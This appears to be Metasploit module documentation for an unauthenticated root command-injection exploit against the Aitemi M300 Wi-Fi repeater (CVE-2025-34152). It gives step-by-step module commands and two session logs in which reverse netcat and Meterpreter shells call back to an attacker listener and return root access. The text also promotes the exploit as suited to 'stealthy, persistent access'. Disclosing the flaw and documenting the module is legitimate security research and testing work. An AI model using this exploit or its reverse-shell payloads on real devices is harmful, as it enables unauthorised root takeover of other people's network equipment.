## Vulnerable Application

This Metasploit module exploits an **unauthenticated OS command injection** vulnerability
in the **Shenzhen Aitemi M300 Wi-Fi Repeater (hardware model MT02)**.

The vulnerability exists in the `time` parameter of the `time_conf` function, accessible via the `/protocol.csp` endpoint.
When passed to the backend, the parameter is inserted directly into a `date -s` shell
command without sanitization, allowing arbitrary command execution as **root**.
The exploit does **not require authentication**, **does not reboot the device**,
and **does not affect network configuration**, making it suitable for stealthy, persistent access.

The vulnerability is tracked as **CVE-2025-34152**.

### Setup

Purchase the vulnerable device here:
[https://www.aliexpress.us/item/3256806767641280.html](https://www.aliexpress.us/item/3256806767641280.html)

Ensure the repeater is accessible via its management interface (typically `http://192.168.11.1` when connected locally via Wi-Fi).

## Verification Steps

1. Connect to the repeater's Wi-Fi and obtain its IP (usually `192.168.11.1`).
2. Launch **Metasploit Framework**.
3. Use the module:
```
use exploit/linux/http/aitemi_m300_time_rce
```
4. Set the target IP:
```
set RHOSTS [TARGET_IP]
```
5. Choose the appropriate target:
```
set TARGET 0        # For simple reverse shell (netcat)
set TARGET 1        # For Meterpreter payload (may crash HTTP server)
```
6. Execute the exploit:
```
run
```

## Options

None

## Scenarios

### Scenario 1 – Target 0: Unix Reverse Shell (netcat)

```bash
msf6 exploit(linux/http/aitemi_m300_time_rce) > show targets

Exploit targets:
=================

    Id  Name
    --  ----
=>  0   Unix Command Shell (reverse_netcat)
    1   Linux Meterpreter MIPSBE (MAY crash HTTP worker)


msf6 exploit(linux/http/aitemi_m300_time_rce) > set payload cmd/unix/reverse_netcat
payload => cmd/unix/reverse_netcat
msf6 exploit(linux/http/aitemi_m300_time_rce) > run http://192.168.11.1
[*] Started reverse TCP handler on 192.168.11.208:1337 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] Favicon hash matched – likely Aitemi M300 device
[+] HTTP server version matched: lighttpd/1.4.32
[+] HTML fingerprint matched in home.html – UI strings detected
[+] The target is vulnerable. HTML language markers confirmed
[*] Command shell session 4 opened (192.168.11.208:1337 -> 192.168.11.1:58090) at 2025-08-07 01:02:06 +0200

id
uid=0(root) gid=0(root)
uname -a
Linux Srepeater 4.4.194 #0 Fri Jun 30 03:16:53 2023 mips GNU/Linux
ls -l
drwxr-xr-x    2 root     root           775 Sep 25 23:32 bin
drwxr-xr-x    3 root     root           860 Sep 25 23:32 dev
drwxrwxr-x    1 root     root             0 Sep 25 23:33 etc
drwxr-xr-x   11 root     root           441 Sep 25 23:32 lib
drwxr-xr-x    2 root     root             0 Sep 25 23:32 media
drwxr-xr-x    2 root     root             3 Sep 25 23:32 mnt
drwxr-xr-x    5 root     root             0 Sep 25 23:32 overlay
dr-xr-xr-x   58 root     root             0 Jan  1  1970 proc
drwxr-xr-x   17 root     root           235 Sep 25 23:32 rom
drwxr-xr-x    2 root     root             3 Sep 25 23:32 root
drwxrwxr-x    2 root     root           707 Sep 25 23:32 sbin
dr-xr-xr-x   11 root     root             0 Jan  1  1970 sys
drwxrwxrwt   16 root     root           500 Sep 25 23:33 tmp
drwxr-xr-x    7 root     root            89 Sep 25 23:32 usr
lrwxrwxrwx    1 root     root             4 Sep 25 23:32 var -> /tmp
drwxr-xr-x    1 root     root             0 Sep 25 23:32 webs
drwxr-xr-x    4 root     root            67 Sep 25 23:32 www
```

### Scenario 2 – Target 1: Meterpreter MIPSBE Payload

```bash
msf6 exploit(linux/http/aitemi_m300_time_rce) > set target 1
target => 1
msf6 exploit(linux/http/aitemi_m300_time_rce) > set payload cmd/linux/http/mipsbe/meterpreter/reverse_tcp
payload => cmd/linux/http/mipsbe/meterpreter/reverse_tcp
msf6 exploit(linux/http/aitemi_m300_time_rce) > run http://192.168.11.1
[*] Started reverse TCP handler on 192.168.11.208:1337 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] Favicon hash matched – likely Aitemi M300 device
[+] HTTP server version matched: lighttpd/1.4.32
[+] HTML fingerprint matched in home.html – UI strings detected
[+] The target is vulnerable. HTML language markers confirmed
[*] Sending stage (1358312 bytes) to 192.168.11.1
[*] Meterpreter session 10 opened (192.168.11.208:1337 -> 192.168.11.1:41150) at 2025-08-07 01:12:10 +0200

meterpreter > sysinfo 
Computer     : Srepeater.lan
OS           :  (Linux 4.4.194)
Architecture : mips
BuildTuple   : mips-linux-muslsf
Meterpreter  : mipsbe/linux
meterpreter > getuid
Server username: root
meterpreter > 
```

